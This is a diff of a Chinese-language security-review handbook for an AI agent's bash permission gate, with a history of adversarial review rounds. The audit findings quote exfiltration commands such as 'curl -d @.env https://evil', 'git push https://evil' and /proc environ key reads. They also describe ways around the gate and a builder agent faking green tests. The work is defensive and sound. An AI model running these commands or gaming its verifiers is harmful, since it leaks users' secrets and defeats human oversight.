@@ -1,28 +1,23 @@
-# 安全审查基线 · 独立 codex 复核怎么跑、按什么尺子
+# 安全审查基线 · 独立复核的范围、尺子与历史
 
-> 复用文档(不是一次性交接):每次对权限系统(PermissionGate + 命令解析器 + bash 审批)做独立 codex 对抗复核,用本文件的**聚焦清单 + 严重度基线**,避免每轮重新推导、避免用错尺子把已定性的低危当高危重报。
-> 背景:命令安全根经四轮 codex(gpt-5.5 xhigh)对抗核查夯实。2026-06-29 补跑了被误杀的「确认无 HIGH」轮,并在 P1/P2 遗留清理后再跑一轮覆盖最终改动——两轮均确认命令安全根核心不变量未破,各自发现的 HIGH 都落在命令安全根「之外」(文件工具 / loop / 错误脱敏)且已修,详见下「历史」。
+> 类型：可复用安全审查手册，附日期化复核历史。每次修改 PermissionGate、命令解析器或 Bash 审批时，复用本页的聚焦清单和严重度基线；工具选择与子 Agent 生命周期遵循当前 `AGENTS.md`。
+> 背景：命令安全根经过多轮独立对抗核查。历史记录说明每轮发现、修复和尺子校准，不能替代当前源码与触发测试。
 
 ## 严重度基线(关键 —— B11 之后)
 
 `f537d94 (B11)` 起,**bash(executes-code)永远每次人审**:gate 不给 executes-code 任何 session 授权,decide 的规则只能 deny bash、永不 allow;唯一静默泄漏路径(grep 工具递归)早已修。因此尺子是:
 
 - **HIGH(P0,要报)= 有静默路径或崩溃绕闸**:① 任何工具**不经人审**就读出/泄漏密钥(如当年的 grep 递归);② 让 executes-code 调用 `allowed:true` 却**没问 approver**(gate/decide 的 bug);③ 非 bash 工具能力误判致危险副作用自动放行;④ `analyzeCommand` **抛异常(非 fail-closed)或挂死**;⑤ gatedRun 执行了被 deny 的调用,或「解析的串 ≠ 执行的串」。
-- **LOW(简列,不深挖)= deny→ask 的降级**:某个冷门 exec-vector(`fc`/`PROMPT_COMMAND`/没进黑名单的内建…)被判 ask 而非 deny——**B11 后这是人可见的,不是高危**;还有 `${var@P}` 跨语句污点、scp/rsync 远端路径、文件读取器不在 FILE_PATH_PROGS 名单里的密钥读(降 ask)等。
+- **LOW(简列,不深挖)= deny→ask 的降级**:某个冷门 exec-vector(`fc`/`PROMPT_COMMAND`/没进黑名单的内建…)被判 ask 而非 deny——**B11 后会被人看见，按低危处理**;还有 `${var@P}` 跨语句污点、scp/rsync 远端路径、文件读取器不在 FILE_PATH_PROGS 名单里的密钥读(降 ask)等。
 
 > 务必在 prompt 里写明这条基线,否则 codex 会用宽尺子把这些 LOW 重报成 P0/P1(前四轮就是这样,已收敛、别再吵)。
 
-## 跑法(本机 codex 0.142,gpt-5.5 xhigh)
+## 跑法
 
-```
-codex exec -s danger-full-access --skip-git-repo-check -m gpt-5.5 \
-  -c "model_reasoning_effort=xhigh" -c "notify=[]" -C H:\jarvis-agent - < <prompt>
-```
-- 读取 prompt 走 stdin(`-`);输出走 stdout(重定向到文件再读)。
-- `~/.codex/config.toml` 默认就是 gpt-5.5 + xhigh + `service_tier=default` + `danger-full-access`,无需再加 `-c service_tier=fast`(那是旧 0.125 的坑,已不适用)。
-- README/CLAUDE.md 的「调 codex 必加 fast」已过时(现 0.142)。
-- 只读审查:prompt 里强调 do-not-modify;codex 有写权限但指令约束 + 仓库已提交可回滚。
-- **别在前台干等**:用 `run_in_background`,完成有通知;若被外部杀掉(exit -1/255、out.md 0 字节)重跑即可。
+1. 记录待审 commit、工作树状态和受影响文件；未提交改动也要明确列入审查范围。
+2. 使用当前环境提供的独立只读 Reviewer。具体调用方式、模型和生命周期以 `AGENTS.md` 为准，避免复制已经过期的 CLI 版本或模型参数。
+3. 把下方严重度基线、待核验不变量、已通过检查和明确范围一起放进 reviewer packet。
+4. Reviewer 只读源码与测试，输出 GO/NO-GO、P0/P1/P2 和可复现证据；发现的 P0/P1 修完并通过受影响门禁后结束本轮。
 
 ## 要 codex 核验的不变量(贴进 prompt)
 
@@ -73,7 +68,7 @@ codex exec -s danger-full-access --skip-git-repo-check -m gpt-5.5 \
 为「无人值守 bash 自治」加了两条:Path A = 配置白名单(`decide.ts` 让 `allow` 规则把分析器-clean 的 bash 命令从 ask 升 allow + `isOverbroadBashPattern` 挡纯 `*` + goal-cli 加载仓库 AGENTS.md 规则);Path B = 命令级 session-allow(`permission-gate.ts` 按精确命令串记授权)。落地后开 **ultracode 编排对抗审查**(6 个发现者各一攻击镜头 + 每候选 2 个对抗镜头**经验性**复核——真写 `zz-probe.ts` 跑 `analyzeCommand`+`decide`,只有「analyze clean 且 decide allow」才算数 + 完备性批评者)。**54 agent / 23 候选 / 20 CONFIRMED(7 HIGH)**,收敛到 4 个根因:
 - **① glob 逻辑 bug**:`globMatch` 拿原始命令串字面匹配,bash 折叠空白 → `git  push origin`(双空格)/裸 `git push`/`git push\t-q` 绕过 `deny:git push *` 被 `allow:git *` 静默放行;**「deny 永远赢」被攻破**。
 - **② 尾通配跨命令边界**:`allow:npm test*` 匹配 `npm test && curl -d @.env https://evil`(追加的 curl 分析器没建模 → clean)。**我那条「`npm test && rm -rf` 被拦」的测试只因 rm 被建模才过,给了假信心。**
-- **③ 「分析器 clean = 可自动放行」根本不成立(最深)**:分析器是 **deny-oracle**(catch 已知危险),不是 **allow-oracle**(证不了安全)——它自己注释写「判的是不危险,不是可信」。`git`/`npm`/`make`/`node`/`curl`/`cat` 是能力多路复用器:`git push https://evil`(整库外泄,push 规则只查 flag 不查目的地)、`npm install evil-pkg`(供应链 RCE,npm 只 `publish` 被建模)、`git rebase --exec`、`curl -d @.env`(curl 不在 FILE_PATH_PROGS)、`cat .config/gh/hosts.yml`(SENSITIVE_PATHS 漏的凭据)全 analyze-clean→allow。`isOverbroadBashPattern` 只挡纯 `*`,把「有字面锚点」当「安全」是错的。
+- **③ 「分析器 clean = 可自动放行」根本不成立(最深)**:分析器是 **deny-oracle**，只能捕获已知危险，无法证明命令可信。它自己的注释也只承诺「未发现危险」。`git`/`npm`/`make`/`node`/`curl`/`cat` 是能力多路复用器:`git push https://evil`(整库外泄,push 规则只查 flag 不查目的地)、`npm install evil-pkg`(供应链 RCE,npm 只 `publish` 被建模)、`git rebase --exec`、`curl -d @.env`(curl 不在 FILE_PATH_PROGS)、`cat .config/gh/hosts.yml`(SENSITIVE_PATHS 漏的凭据)全 analyze-clean→allow。`isOverbroadBashPattern` 只挡纯 `*`,把「有字面锚点」当「安全」是错的。
 - **④ 信任反转(架构)**:goal-cli 从 **cwd(被操作的仓库本身)** 加载白名单进 enforcement——可信的全局 `~/AGENTS.md` 被排除,最不可信的仓库内文件反而生效。恶意仓库自带 `allow:[bash:sh ./setup.sh]`+`setup.sh` = 零配置静默 ACE。我的改动**激活**了这条(改前 bash allow 对 executes-code 完全失效)。
 - **处置(用户拍板「回退 Path A、保留 Path B」)**:回退 `decide.ts`(allow 升级)+ `goal-cli.ts`(规则加载)+ 其测试;**保留 Path B**——审查复核确认命令级 session-allow 安全(精确串匹配无 glob、需人交互批准、内存态 resume 安全、deny 先判、每次重跑分析器,**当时仅 REPL 可达**)。**2026-07-01 更新**:slice-2 ② 经 2 轮 codex 审查把命令级 `allow-session` 也暴露给 **attended goal/loop**(`interactive-approver.ts`,仅 bash;非 bash 不给 session=codex MEDIUM 修复;无人值守仍 fail-closed),gate 零改;残留 **HIGH defer**=调度器命令(npm/make)「同串不同义」TOCTOU,真修需行为文件指纹(见 `docs/handoff-next.md` bash-allow 段 + memory `restore-bash-session-allow`)。`decide.ts` 那条 TODO 改成诚实结论(防再试)。529 测试,四关卡绿。
 - **印证**:① **deny-oracle ≠ allow-oracle**——一个为「人审兜底」设计的危险检测器,被当成「无人值守自动放行的安全证明」用就崩;auto-allow 需要正向安全论证,glob 前缀给不了。② **别从被审查的产物里读 enforcement 配置**(信任反转):in-repo allow-list 在 agent 处理不可信仓库时即攻击者授权;held-out 文件要放 cwd 外是同一条教训的另一面。③ **自己写的测试会制造假信心**(②的 rm 测试)——对抗验证比作者自测狠在这。④ 落点:无人值守 bash 自治撞上和 #2/#6 **同一堵沙箱墙**,本线安全部分(Path B)交付、无人值守部分诚实 defer。
@@ -87,8 +82,8 @@ codex exec -s danger-full-access --skip-git-repo-check -m gpt-5.5 \
 - **印证**：① 4 裁判里只有 codex 抓到「/proc 显示初始 env」这个 OS 语义坑——**单看代码逻辑对（删了 env）不等于对（/proc 不读运行时 env）**,需要懂底层语义的裁判；前轮 3 裁判（含我）都漏了。② 「孪生死代码」(recordNonReject) 印证 #6 的教训会复发——删一个死 guardrail 时要扫同类。③ fail-closed 分支「reachable 但没触发测试」就是下一个 VerifierMonitor 候选，补测试钉死。
 
 ### 2026-06-30 · checklist #6 收口（裁判能力边界 + 死 guardrail 清除）
-不是对抗轮，是 leg-3 checklist #6 收口时的死代码发现，记此因为正中「绿灯≠成功」主题。D8 的 `VerifierMonitor`（couldNotVerify 率告警）**经 2026-06-29 leg-3 轮两裁判核查时判「通过」**——但那只核了「类在 report!==undefined 时正确 record」，**没核「接线后能不能真触发」**。#6 收口写「健康监控接线触发单测」时发现：单 goal 内 couldNotVerify 是终态（→blocked、loop break），`monitor` 又是 per-goal 实例，所以**至多记录 1 次 couldNotVerify**、永远凑不够阈值（≥4 且率>0.6）→ **不可达死 guardrail**。已删（接线 + 类 + 测试），文档化「couldNotVerify 率是跨 goal 信号，待 Loop 调度落地再加」。同时确认 #6 另一半：裁判 prompt 与 read/grep 白名单一致（无误导执行措辞），「跑命令/驱动 app」需 OS 沙箱、维持纯文件取证。
-- **印证**：组件级 review（「这个类逻辑对吗」）挡不住系统级不可达（「这条线在真实状态机里能走到吗」）——和熔断滑窗、CodeWhale「只自增不读」同类。**guardrail 的触发单测必须走真实接线路径**（integration），只测类本身会漏掉「类没问题、但永远调不到阈值」。教训补强了 baseline 既有铁律：写触发测试时若发现「构造不出触发输入」，那不是测试难写，是 guardrail 死了。
+这条来自 leg-3 checklist #6 收口时的死代码发现，正中「绿灯≠成功」主题。D8 的 `VerifierMonitor`（couldNotVerify 率告警）**经 2026-06-29 leg-3 轮两裁判核查时判「通过」**——但那只核了「类在 report!==undefined 时正确 record」，**没核「接线后能不能真触发」**。#6 收口写「健康监控接线触发单测」时发现：单 goal 内 couldNotVerify 是终态（→blocked、loop break），`monitor` 又是 per-goal 实例，所以**至多记录 1 次 couldNotVerify**、永远凑不够阈值（≥4 且率>0.6）→ **不可达死 guardrail**。已删（接线 + 类 + 测试），文档化「couldNotVerify 率是跨 goal 信号，待 Loop 调度落地再加」。同时确认 #6 另一半：裁判 prompt 与 read/grep 白名单一致（无误导执行措辞），「跑命令/驱动 app」需 OS 沙箱、维持纯文件取证。
+- **印证**：组件级 review（「这个类逻辑对吗」）挡不住系统级不可达（「这条线在真实状态机里能走到吗」）——和熔断滑窗、CodeWhale「只自增不读」同类。**guardrail 的触发单测必须走真实接线路径**（integration），只测类本身会漏掉「类没问题、但永远调不到阈值」。写触发测试时若构造不出输入，通常说明 guardrail 已经死亡，继续调整测试没有价值。
 
 ### 2026-06-30 · model-facing bash 密钥脱敏轮
 给 model-facing bash 加 env 脱敏（防 agent `echo $ARK_API_KEY` exfil）后跑的一轮。**两个独立裁判**——codex(gpt-5.5 xhigh)报 3 HIGH、独立 Claude 子代理报 1 HIGH——**收敛在「脱敏只删子 shell 的 env 拷贝、父 node 进程仍持有 key」**：`shellEnv` 做 `{...process.env}` 后只从拷贝删 secret，`loadDoubaoConfig` 读 key 后从不 delete，provider 捕获后 `process.env.ARK_API_KEY` 纯属残留。Linux 上 model-facing bash 经 `cat/strings /proc/$PPID/environ`、`ps eww $PPID` 读回**未脱敏**的 key——三条都过命令分析器（clean→ask）。`echo $ARK_API_KEY`/`printenv` 读的是已脱敏的子 shell 拷贝、确实拿不到，**脱敏只挡住了最 naive 那条**。win32 无 /proc 不复现，但 harness provider 无关、可部署 Linux，判 HIGH。codex 另独立抓到两条：① `grep -a . .env` 漏拦（`grep` 不在 `FILE_PATH_PROGS`，分析器放行 → bash grep 读 .env）；② denylist 漏常见名（`GITHUB_PAT`/`DATABASE_URL`/`MONGODB_URI`/`SENTRY_DSN`…）。
@@ -102,7 +97,7 @@ held-out 腿(goal-setter 秘密隐藏断言、builder 看不到)落地后跑的�
 
 ### 2026-06-29 · Phase D 腿3 轮(独立 LLM 裁判 / 第二批)
 腿3(独立只读 LLM 裁判)落地后跑的一轮(D6–D9)。**两个独立裁判**——codex(gpt-5.5 xhigh)报 2 HIGH、独立 Claude 子代理报 no-HIGH(确认 12 条不变量未破)——**收敛在同一个超时缺口**:`runVerifier` 无墙钟超时,verifier 模型流卡在 `stream.next()` 时 `maxTurns` 只在轮间生效 → goal 挂死、不能 fail-closed 合成 couldNotVerify。codex 判 HIGH(「挂死非 fail-closed」,腿3 尺子里「挂死」明列 HIGH-3,且 Part7 §6.2 本设计了分级超时),Claude 判 LOW(liveness 非假阳性)。另 codex 独立抓到 `credential` 单数漏拦(`sensitive.ts` 只匹配复数 `credentials`,漏 `credential.json` → ungated 裁判可读送远端模型);Claude 独立抓到 decideVerdict 的 `report===undefined` 边界靠 runVerifier 契约而非边界强制(LOW,不可达 shipped 入口)。三处全部已修 + 触发单测 + post-fix 四关卡(495 测试):① runVerifier `Promise.race` + 复合 abort(父 signal ∪ 120s)超时 → couldNotVerify;② 正则 `credentials?` 覆盖单/复数 + read 拒读单测;③ goal-loop 加 report===undefined 边界防御合成 couldNotVerify。其余不变量(decideVerdict 腿1/2 先判、注入不可绕、自报 verdict 被剥离、空 pinned verified 不可达、registry 只读、redact、独立性 config 断言、熔断真接线、最高优先级不变量 runVerifier 永返回 report)两裁判均确认未破。
-- **印证**:腿3 的 fail-closed 不只「判定方向对」(永不假阳性 verified),还得保证「有限时间内一定给出判定」——**挂死也是一种没 fail-closed**。这轮收敛点(liveness)与第一批收敛点(可信根可被改写)互补:验收 backstop 既要判得对、也要判得完。腿3 把证据送第二(可能跨家族)模型,使「裁判读密钥」面比 builder 单模型更尖锐 → 密钥禁读名单要更严(credential 单数)。
+- **印证**：腿3 的 fail-closed 同时要求判定方向可靠、并在有限时间内返回；挂死同样属于失败。这轮收敛点（liveness）与第一批收敛点（可信根可被改写）互补：验收 backstop 既要判得对，也要判得完。腿3 把证据送给第二个模型，裁判侧的密钥读取面更尖锐，因此密钥禁读名单要覆盖 `credential` 单数等变体。
 
 ### 2026-06-29 · Phase D goal 验收轮(GoalLoop 第一批)
 Phase D 第一批(GoalLoop + 确定性两条腿验收)后跑的一轮(commit D1–D5)。**两个独立裁判**(codex gpt-5.5 xhigh + 独立 Claude 子代理)**各自独立**抓到同一个 HIGH:**检查命令的 oracle 可被 builder 中性化** —— 腿1 跑 `npm test/build` 等,但命令定义在 `package.json` scripts / tsconfig / eslint/vitest config,这些文件不在腿2 的 `test/` 监控范围;builder 改 `package.json` 的 `"test":"exit 0"` 即让四关卡全绿、腿2 看不到 → 假 verified(命中「凑绿不被腿2 抓」,走配置而非 test/ 文件)。已修:腿2 把 check-oracle 文件(package.json/lockfile/tsconfig/eslint/vitest/jest config)纳入篡改检测 + 改全工作区 diff + git 失败 fail-closed + 空 checkCommands fail-closed + SKIP 正则扩 focus 标记;+4 触发单测钉死 + post-fix 复核。其余不变量(claim 不终态化、checkCommands 只从 config、熔断真接线、verified 仅显式分支兜底 fail-closed、objective 不可变、assertNever)两裁判均确认未破。
@@ -120,4 +115,4 @@ Phase C 新增 subagent 工具面后跑的一轮(commit C1–C5)。**两个独�
 - redactSecrets 单引号绕过(错误信息回显密钥)— 正则支持单/双引号。
 印证结论:codex 的价值在抓「静默 / 崩溃 / 绕闸」类结构问题(尤其裁判核出运动员自己引入的 bug),而非黑名单枚举完整性。
 
-四轮 codex 在「黑名单枚举 exec-vector」上不收敛(每轮找出更冷门的:trap/alias/env -S/mapfile -C/bind -x/ssh/`${x:$(...)}`…),这是黑名单的固有性质,不是解析器缺陷。结论(见 memory `restore-bash-session-allow`):**让人审做墙**(B11)+ 黑名单做纵深。~~无人值守自治(Phase D)再上白名单~~ **——这个「再上白名单」的设想已被 2026-06-30 bash 白名单轮证伪**(见下):命令模式 allow-list 自动放行本质不安全(分析器是 deny-oracle 非 allow-oracle),无人值守 bash 自治与 #2/#6 同样**沙箱前置**。所以后续复核重点是「有没有静默/崩溃/绕闸」,而非「黑名单是否枚举全」。
+四轮 codex 在「黑名单枚举 exec-vector」上不收敛(每轮找出更冷门的:trap/alias/env -S/mapfile -C/bind -x/ssh/`${x:$(...)}`…)。这属于黑名单的固有性质，不能归因于单个解析器缺陷。结论(见 memory `restore-bash-session-allow`):**让人审做墙**(B11)+ 黑名单做纵深。~~无人值守自治(Phase D)再上白名单~~ **——这个「再上白名单」的设想已被 2026-06-30 bash 白名单轮证伪**(见下):命令模式 allow-list 自动放行本质不安全，分析器只能充当 deny-oracle；无人值守 bash 自治与 #2/#6 同样**沙箱前置**。后续复核重点放在静默路径、崩溃和绕闸，停止追求枚举完整。
